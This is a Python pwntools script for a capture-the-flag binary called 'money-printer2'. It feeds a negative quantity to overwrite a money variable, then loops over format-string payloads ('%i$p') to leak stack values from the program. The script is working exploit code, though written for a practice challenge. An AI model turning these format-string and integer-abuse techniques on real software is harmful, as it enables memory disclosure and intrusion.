#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './money-printer2'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'warn'
host = 'greed.sdc.tf'
port = 1337


# =========================================================
#                          FUZZ
# =========================================================

for i in range(0, 30):
    try:
        io = process(exe)
        # overwriting dollar variable
        io.sendlineafter(b'how many of them do you want?', b'-1001')
        # format string vuln
        io.sendlineafter(b'to the audience?', f'%{i}$p'.encode())
        io.recvuntil(b'\n')
        leak = io.recvline()
        print(f"{i}:", leak)
        io.close()
    except EOFError or UnicodeDecodeError:
        pass